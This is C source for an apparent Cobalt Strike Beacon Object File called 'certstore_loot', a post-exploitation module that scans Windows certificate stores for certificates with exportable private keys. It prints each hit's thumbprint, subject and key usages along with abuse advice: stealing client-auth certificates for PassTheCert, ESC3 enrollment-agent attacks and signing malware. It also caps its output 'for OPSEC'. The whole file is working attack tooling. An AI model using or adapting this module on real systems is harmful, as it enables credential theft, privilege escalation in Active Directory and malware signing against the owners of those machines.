#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <stddef.h>
#include <stdint.h>
#include "beacon.h"


#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR  0x0d

#ifndef CERT_SHA1_HASH_PROP_ID
#define CERT_SHA1_HASH_PROP_ID              0x00000003
#endif
#ifndef CERT_KEY_PROV_INFO_PROP_ID
#define CERT_KEY_PROV_INFO_PROP_ID          0x00000002
#endif

#ifndef szOID_PKIX_KP_CLIENT_AUTH
#define szOID_PKIX_KP_CLIENT_AUTH           "1.3.6.1.5.5.7.3.2"
#endif
#ifndef szOID_PKIX_KP_SMARTCARD_LOGON
#define szOID_PKIX_KP_SMARTCARD_LOGON       "1.3.6.1.4.1.311.20.2.2"
#endif
#ifndef szOID_ENROLLMENT_AGENT
#define szOID_ENROLLMENT_AGENT              "1.3.6.1.4.1.311.20.2.1"
#endif
#ifndef szOID_PKIX_KP_CODE_SIGNING
#define szOID_PKIX_KP_CODE_SIGNING          "1.3.6.1.5.5.7.3.3"
#endif
#ifndef szOID_EFS
#define szOID_EFS                           "1.3.6.1.4.1.311.10.3.4"
#endif
#ifndef szOID_ENHANCED_KEY_USAGE
#define szOID_ENHANCED_KEY_USAGE            "2.5.29.37"
#endif

// Constants - Key specification
#ifndef CERT_NCRYPT_KEY_SPEC
#define CERT_NCRYPT_KEY_SPEC                0xFFFFFFFF
#endif

// Constants - CNG Export Policy
#ifndef NCRYPT_ALLOW_EXPORT_FLAG
#define NCRYPT_ALLOW_EXPORT_FLAG            0x00000001
#endif
#ifndef NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG
#define NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG  0x00000002
#endif

// Constants - Provider parameters
#ifndef PP_IMPTYPE
#define PP_IMPTYPE                          3
#endif
#ifndef CRYPT_IMPL_HARDWARE
#define CRYPT_IMPL_HARDWARE                 1
#endif

// Constants - Error codes
#ifndef ERROR_ACCESS_DENIED
#define ERROR_ACCESS_DENIED                 5
#endif

// Constants - Store location flags
#ifndef CERT_SYSTEM_STORE_CURRENT_USER
#define CERT_SYSTEM_STORE_CURRENT_USER      0x00010000
#endif
#ifndef CERT_SYSTEM_STORE_LOCAL_MACHINE
#define CERT_SYSTEM_STORE_LOCAL_MACHINE     0x00020000
#endif
#ifndef CERT_STORE_PROV_SYSTEM_A
#define CERT_STORE_PROV_SYSTEM_A            (LPCSTR)10
#endif


#define MAX_CERT_OUTPUT_PER_STORE 64  


DECLSPEC_IMPORT WINBASEAPI HCERTSTORE WINAPI CRYPT32$CertOpenSystemStoreA(HCRYPTPROV hProv, LPCSTR szSubsystemProtocol);
DECLSPEC_IMPORT WINBASEAPI HCERTSTORE WINAPI CRYPT32$CertOpenStore(LPCSTR lpszStoreProvider, DWORD dwEncodingType, HCRYPTPROV_LEGACY hCryptProv, DWORD dwFlags, const void *pvPara);
DECLSPEC_IMPORT WINBASEAPI PCCERT_CONTEXT WINAPI CRYPT32$CertEnumCertificatesInStore(HCERTSTORE hCertStore, PCCERT_CONTEXT pPrevCertContext);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI CRYPT32$CertCloseStore(HCERTSTORE hCertStore, DWORD dwFlags);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI CRYPT32$CertGetCertificateContextProperty(PCCERT_CONTEXT pCertContext, DWORD dwPropId, void *pvData, DWORD *pcbData);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI CRYPT32$CertGetNameStringA(PCCERT_CONTEXT pCertContext, DWORD dwType, DWORD dwFlags, void *pvTypePara, LPSTR pszNameString, DWORD cchNameString);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI CRYPT32$CryptAcquireCertificatePrivateKey(PCCERT_CONTEXT pCert, DWORD dwFlags, void *pvParameters, HCRYPTPROV_OR_NCRYPT_KEY_HANDLE *phCryptProvOrNCryptKey, DWORD *pdwKeySpec, BOOL *pfCallerFreeProvOrNCryptKey);
DECLSPEC_IMPORT WINBASEAPI PCERT_EXTENSION WINAPI CRYPT32$CertFindExtension(LPCSTR pszObjId, DWORD cExtensions, CERT_EXTENSION rgExtensions[]);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI CRYPT32$CryptDecodeObjectEx(DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE *pbEncoded, DWORD cbEncoded, DWORD dwFlags, PCRYPT_DECODE_PARA pDecodePara, void *pvStructInfo, DWORD *pcbStructInfo);
DECLSPEC_IMPORT WINBASEAPI VOID * WINAPI KERNEL32$LocalFree(VOID *hMem);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptFreeObject(NCRYPT_HANDLE hObject);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptGetProperty(NCRYPT_HANDLE hObject, LPCWSTR pszProperty, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, DWORD dwFlags);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$CryptGetProvParam(HCRYPTPROV hProv, DWORD dwParam, BYTE *pbData, DWORD *pdwDataLen, DWORD dwFlags);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$CryptReleaseContext(HCRYPTPROV hProv, DWORD dwFlags);
DECLSPEC_IMPORT WINBASEAPI int WINAPI KERNEL32$lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2);

static void inline_memset(void *dest, int value, size_t count) {
    unsigned char *d = (unsigned char *)dest;
    while (count--) {
        *d++ = (unsigned char)value;
    }
}

static void inline_memzero(void *dest, size_t count) {
    inline_memset(dest, 0, count);
}

static BOOL oid_matches(LPCSTR oid, LPCSTR target) {
    if (!oid || !target) return FALSE;
    while (*oid && *target && *oid == *target) {
        oid++;
        target++;
    }
    return (*oid == *target);
}

static BOOL has_eku(PCCERT_CONTEXT pCert, LPCSTR targetOid) {
    PCERT_EXTENSION pExt = CRYPT32$CertFindExtension(
        szOID_ENHANCED_KEY_USAGE,
        pCert->pCertInfo->cExtension,
        pCert->pCertInfo->rgExtension
    );
    
    if (!pExt) return FALSE;
    
    CERT_ENHKEY_USAGE *pUsage = NULL;
    DWORD cbUsage = 0;
    
    if (!CRYPT32$CryptDecodeObjectEx(
        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
        szOID_ENHANCED_KEY_USAGE,
        pExt->Value.pbData,
        pExt->Value.cbData,
        CRYPT_DECODE_ALLOC_FLAG,
        NULL,
        &pUsage,
        &cbUsage
    )) {
        return FALSE;
    }
    
    BOOL found = FALSE;
    for (DWORD i = 0; i < pUsage->cUsageIdentifier; i++) {
        if (oid_matches(pUsage->rgpszUsageIdentifier[i], targetOid)) {
            found = TRUE;
            break;
        }
    }
    
    if (pUsage) KERNEL32$LocalFree(pUsage);
    return found;
}

static BOOL check_exportable_key(PCCERT_CONTEXT pCert) {
    HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKey = 0;
    DWORD dwKeySpec = 0;
    BOOL fCallerFree = FALSE;
    BOOL isExportable = FALSE;
    
    if (!CRYPT32$CryptAcquireCertificatePrivateKey(
        pCert,
        CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG | CRYPT_ACQUIRE_SILENT_FLAG,
        NULL,
        &hKey,
        &dwKeySpec,
        &fCallerFree
    )) {
        return FALSE;
    }
    
    if (dwKeySpec == CERT_NCRYPT_KEY_SPEC) {
        DWORD exportPolicy = 0;
        DWORD cbData = sizeof(exportPolicy);
        WCHAR exportPolicyProp[] = L"Export Policy";
        
        if (NCRYPT$NCryptGetProperty(
            hKey,
            exportPolicyProp,
            (PBYTE)&exportPolicy,
            sizeof(exportPolicy),
            &cbData,
            0
        ) == 0) {
            isExportable = (exportPolicy & NCRYPT_ALLOW_EXPORT_FLAG) ||
                           (exportPolicy & NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG);
        } else {
            isExportable = TRUE;
        }
    } else {
        DWORD dwImplType = 0;
        DWORD dwSize = sizeof(dwImplType);
        BOOL isHardware = FALSE;
        
        if (ADVAPI32$CryptGetProvParam(hKey, PP_IMPTYPE, (BYTE*)&dwImplType, &dwSize, 0)) {
            isHardware = (dwImplType == CRYPT_IMPL_HARDWARE);
        }
        isExportable = !isHardware;
    }
    
    if (fCallerFree) {
        if (dwKeySpec == CERT_NCRYPT_KEY_SPEC) {
            NCRYPT$NCryptFreeObject(hKey);
        } else {
            ADVAPI32$CryptReleaseContext(hKey, 0);
        }
    }
    
    return isExportable;
}

static int get_eku_priority(PCCERT_CONTEXT pCert) {
    if (has_eku(pCert, szOID_PKIX_KP_CODE_SIGNING) ||
        has_eku(pCert, szOID_PKIX_KP_CLIENT_AUTH)) {
        return 3;  
    }
    if (has_eku(pCert, szOID_EFS)) {
        return 2;  
    }
    if (has_eku(pCert, szOID_PKIX_KP_SMARTCARD_LOGON) ||
        has_eku(pCert, szOID_ENROLLMENT_AGENT)) {
        return 2;  
    }
    return 1;  
}

static BOOL check_cached_eku(CERT_ENHKEY_USAGE *pCachedEku, LPCSTR targetOid) {
    if (!pCachedEku || !targetOid) return FALSE;
    for (DWORD i = 0; i < pCachedEku->cUsageIdentifier; i++) {
        if (oid_matches(pCachedEku->rgpszUsageIdentifier[i], targetOid)) {
            return TRUE;
        }
    }
    return FALSE;
}

typedef struct {
    int totalScanned;
    int exportable;
    int codeSigning;
    int clientAuth;
    int efs;
    int enrollmentAgent;
    int smartcardLogon;
} cert_stats_t;

static BOOL process_store(const char *storeName, DWORD storeLocation, cert_stats_t *stats, int maxPerStore) {
    HCERTSTORE hStore = NULL;
    PCCERT_CONTEXT pCert = NULL;
    CERT_ENHKEY_USAGE *pCachedEku = NULL;  
    int certsPrinted = 0;
    BOOL truncated = FALSE;
    BOOL hasExportable = FALSE;
    const char *locationName = (storeLocation == CERT_SYSTEM_STORE_CURRENT_USER) ? "CurrentUser" : "LocalMachine";
    
    if (storeLocation == CERT_SYSTEM_STORE_CURRENT_USER) {
        hStore = CRYPT32$CertOpenSystemStoreA(0, storeName);
    } else {
        hStore = CRYPT32$CertOpenStore(
            CERT_STORE_PROV_SYSTEM_A,
            0,
            0,
            CERT_SYSTEM_STORE_LOCAL_MACHINE,
            storeName
        );
    }
    
    if (!hStore) {
        DWORD error = KERNEL32$GetLastError();
        if (error != ERROR_ACCESS_DENIED) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed: '%s\\%s': Error %lu\n", locationName, storeName, (unsigned long)error);
        }
        return FALSE;
    }
    
    while ((pCert = CRYPT32$CertEnumCertificatesInStore(hStore, pCert)) != NULL) {
        stats->totalScanned++;
        
        if (!check_exportable_key(pCert)) {
            continue;  
        }
        
        stats->exportable++;
        
        if (!hasExportable) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[+] %s\\%s:\n", locationName, storeName);
            hasExportable = TRUE;
        }
        
        if (certsPrinted >= maxPerStore) {
            truncated = TRUE;
            break;
        }
        certsPrinted++;
        
        DWORD thumbprintSize = 0;
        BYTE thumbprint[20] = {0};
        
        if (!CRYPT32$CertGetCertificateContextProperty(
                pCert,
                CERT_SHA1_HASH_PROP_ID,
                NULL,
                &thumbprintSize)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to get thumbprint size for certificate\n");
            continue;
        }
        
        if (thumbprintSize > 0 && thumbprintSize <= sizeof(thumbprint)) {
            if (!CRYPT32$CertGetCertificateContextProperty(
                    pCert,
                    CERT_SHA1_HASH_PROP_ID,
                    thumbprint,
                    &thumbprintSize)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to get thumbprint property for certificate\n");
                continue;
            }
        }
        
        char subject[512] = {0};
        DWORD subjectLen = CRYPT32$CertGetNameStringA(
            pCert,
            CERT_NAME_SIMPLE_DISPLAY_TYPE,
            0,
            NULL,
            subject,
            sizeof(subject)
        );
        
        if (subjectLen <= 1) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to get subject name for certificate\n");
        }
        
        PCERT_EXTENSION pExt = CRYPT32$CertFindExtension(
            szOID_ENHANCED_KEY_USAGE,
            pCert->pCertInfo->cExtension,
            pCert->pCertInfo->rgExtension
        );
        
        if (pExt && pCachedEku) {
            KERNEL32$LocalFree(pCachedEku);
            pCachedEku = NULL;
        }
        
        if (pExt) {
            DWORD cbUsage = 0;
            if (CRYPT32$CryptDecodeObjectEx(
                X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                szOID_ENHANCED_KEY_USAGE,
                pExt->Value.pbData,
                pExt->Value.cbData,
                CRYPT_DECODE_ALLOC_FLAG,
                NULL,
                &pCachedEku,
                &cbUsage
            )) {
            } else {
                pCachedEku = NULL;
            }
        }
        
        int ekuPriority = 0;
        if (check_cached_eku(pCachedEku, szOID_PKIX_KP_CODE_SIGNING) || check_cached_eku(pCachedEku, szOID_PKIX_KP_CLIENT_AUTH)) {
            ekuPriority = 3;  
        } else if (check_cached_eku(pCachedEku, szOID_EFS)) {
            ekuPriority = 2;  
        } else if (check_cached_eku(pCachedEku, szOID_PKIX_KP_SMARTCARD_LOGON) || check_cached_eku(pCachedEku, szOID_ENROLLMENT_AGENT)) {
            ekuPriority = 2;  
        } else {
            ekuPriority = 1;  
        }
        
        if (ekuPriority >= 3) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] High - ");
        }
        
        if (thumbprintSize > 0 && thumbprintSize <= sizeof(thumbprint)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Thumbprint: ");
            for (DWORD i = 0; i < thumbprintSize && i < sizeof(thumbprint); i++) {
                BeaconPrintf(CALLBACK_OUTPUT, "%02X", thumbprint[i]);
                if (i < thumbprintSize - 1) {
                    BeaconPrintf(CALLBACK_OUTPUT, ":");
                }
            }
            BeaconPrintf(CALLBACK_OUTPUT, "\n");
            
            BeaconPrintf(CALLBACK_OUTPUT, "[i] Path: Cert:\\%s\\%s\\", locationName, storeName);
            for (DWORD i = 0; i < thumbprintSize && i < sizeof(thumbprint); i++) {
                BeaconPrintf(CALLBACK_OUTPUT, "%02X", thumbprint[i]);
            }
            BeaconPrintf(CALLBACK_OUTPUT, "\n");
        }
        
        if (subjectLen > 1) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Subject: %s\n", subject);
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "[i] EKU: ");
        BOOL hasEku = FALSE;
        if (check_cached_eku(pCachedEku, szOID_PKIX_KP_CLIENT_AUTH)) {
            BeaconPrintf(CALLBACK_OUTPUT, "ClientAuth");
            stats->clientAuth++;
            hasEku = TRUE;
        }
        if (check_cached_eku(pCachedEku, szOID_PKIX_KP_SMARTCARD_LOGON)) {
            if (hasEku) BeaconPrintf(CALLBACK_OUTPUT, ", ");
            BeaconPrintf(CALLBACK_OUTPUT, "SmartcardLogon");
            stats->smartcardLogon++;
            hasEku = TRUE;
        }
        if (check_cached_eku(pCachedEku, szOID_ENROLLMENT_AGENT)) {
            if (hasEku) BeaconPrintf(CALLBACK_OUTPUT, ", ");
            BeaconPrintf(CALLBACK_OUTPUT, "CertRequestAgent");
            stats->enrollmentAgent++;
            hasEku = TRUE;
        }
        if (check_cached_eku(pCachedEku, szOID_PKIX_KP_CODE_SIGNING)) {
            if (hasEku) BeaconPrintf(CALLBACK_OUTPUT, ", ");
            BeaconPrintf(CALLBACK_OUTPUT, "CodeSigning");
            stats->codeSigning++;
            hasEku = TRUE;
        }
        if (check_cached_eku(pCachedEku, szOID_EFS)) {
            if (hasEku) BeaconPrintf(CALLBACK_OUTPUT, ", ");
            BeaconPrintf(CALLBACK_OUTPUT, "EFS");
            stats->efs++;
            hasEku = TRUE;
        }
        if (!hasEku) {
            BeaconPrintf(CALLBACK_OUTPUT, "None/Other");
        }
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
        
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Private key: PRESENT, EXPORTABLE\n");
        
        if (check_cached_eku(pCachedEku, szOID_PKIX_KP_CLIENT_AUTH) ||
            check_cached_eku(pCachedEku, szOID_PKIX_KP_SMARTCARD_LOGON)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Abuse: THEFT1 -> steal cert, use TokenCert/PassTheCert\n");
        } else if (check_cached_eku(pCachedEku, szOID_ENROLLMENT_AGENT)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Abuse: Certificate Request Agent -> ESC3 attack\n");
        } else if (check_cached_eku(pCachedEku, szOID_PKIX_KP_CODE_SIGNING)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Abuse: Code-signing certificate -> sign malware\n");
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
        inline_memzero(subject, sizeof(subject));
        inline_memzero(thumbprint, sizeof(thumbprint));
        
        if (pCachedEku) {
            KERNEL32$LocalFree(pCachedEku);
            pCachedEku = NULL;
        }
    }
    
    if (hasExportable && truncated) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Output truncated at %d certificates for OPSEC; rerun with narrower scope if needed\n", maxPerStore);
    }
    
cleanup:
    if (pCachedEku) {
        KERNEL32$LocalFree(pCachedEku);
        pCachedEku = NULL;
    }
    if (hStore) {
        CRYPT32$CertCloseStore(hStore, 0);
    }
    
    return hasExportable;
}

void go(char *args, unsigned long alen) {
    cert_stats_t stats = {0};
    char *storeNameArg = NULL;
    char *locationArg = NULL;
    int maxPerStore = MAX_CERT_OUTPUT_PER_STORE;
    BOOL scanAll = TRUE;
    DWORD targetLocation = 0;
    const char *targetStoreName = NULL;
    
    if (alen > 0) {
        datap parser = {0};
        BeaconDataParse(&parser, args, (int)alen);
        storeNameArg = BeaconDataExtract(&parser, NULL);
        locationArg = BeaconDataExtract(&parser, NULL);
        
        if (storeNameArg && locationArg) {
            if (KERNEL32$lstrcmpiA(locationArg, "CurrentUser") == 0) {
                targetLocation = CERT_SYSTEM_STORE_CURRENT_USER;
                scanAll = FALSE;
                targetStoreName = storeNameArg;
            } else if (KERNEL32$lstrcmpiA(locationArg, "LocalMachine") == 0) {
                targetLocation = CERT_SYSTEM_STORE_LOCAL_MACHINE;
                scanAll = FALSE;
                targetStoreName = storeNameArg;
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] Usage: certstore_loot [<store_name> <CurrentUser|LocalMachine>]\n");
                BeaconPrintf(CALLBACK_OUTPUT, "[-] Invalid location: %s (must be CurrentUser or LocalMachine)\n", locationArg);
                return;
            }
        } else if (storeNameArg || locationArg) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Usage: certstore_loot [<store_name> <CurrentUser|LocalMachine>]\n");
            return;
        }
    }
    
    if (scanAll) {
        process_store("MY", CERT_SYSTEM_STORE_CURRENT_USER, &stats, maxPerStore);
        process_store("MY", CERT_SYSTEM_STORE_LOCAL_MACHINE, &stats, maxPerStore);
        
        process_store("CA", CERT_SYSTEM_STORE_CURRENT_USER, &stats, maxPerStore);
        process_store("CA", CERT_SYSTEM_STORE_LOCAL_MACHINE, &stats, maxPerStore);
        
        process_store("ROOT", CERT_SYSTEM_STORE_CURRENT_USER, &stats, maxPerStore);
        process_store("ROOT", CERT_SYSTEM_STORE_LOCAL_MACHINE, &stats, maxPerStore);
        
        process_store("Disallowed", CERT_SYSTEM_STORE_CURRENT_USER, &stats, maxPerStore);
        process_store("Disallowed", CERT_SYSTEM_STORE_LOCAL_MACHINE, &stats, maxPerStore);
        
        process_store("TrustedPeople", CERT_SYSTEM_STORE_CURRENT_USER, &stats, maxPerStore);
        process_store("TrustedPeople", CERT_SYSTEM_STORE_LOCAL_MACHINE, &stats, maxPerStore);
        
        process_store("SmartCardRoot", CERT_SYSTEM_STORE_CURRENT_USER, &stats, maxPerStore);
        process_store("SmartCardRoot", CERT_SYSTEM_STORE_LOCAL_MACHINE, &stats, maxPerStore);
    } else {
        process_store(targetStoreName, targetLocation, &stats, maxPerStore);
    }

    if (stats.exportable == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[i] Summary: No exportable certificates found (%d total scanned)\n", stats.totalScanned);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Summary: %d exportable certificate(s) found (%d total scanned)\n", stats.exportable, stats.totalScanned);
    }
}

